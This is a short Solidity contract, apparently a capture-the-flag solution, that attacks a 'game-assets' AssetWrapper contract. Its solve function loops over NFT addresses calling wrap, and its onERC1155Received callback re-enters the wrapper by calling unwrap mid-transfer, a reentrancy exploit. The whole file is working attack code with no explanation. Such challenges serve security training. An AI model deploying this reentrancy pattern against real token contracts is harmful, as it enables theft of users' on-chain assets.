pragma solidity ^0.8.0;

import "../game-assets/GameAsset.sol";
import "../game-assets/AssetWrapper.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract SolveGameAssets {
  AssetWrapper wrapper; 
  address currentNFTcall;

  constructor(AssetWrapper _wrapper) {
    wrapper = _wrapper;
  }

  function solve(uint256 nftid, address[] memory nftAddresses) external {
    for (uint256 i; i < nftAddresses.length; ++i) {
      currentNFTcall = nftAddresses[i];
      wrapper.wrap(nftid, address(this), nftAddresses[i]);
    }
  }

  function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
  ) external returns(bytes4) {

    wrapper.unwrap(address(this), currentNFTcall);
    return hex"f23a6e61";
  }
}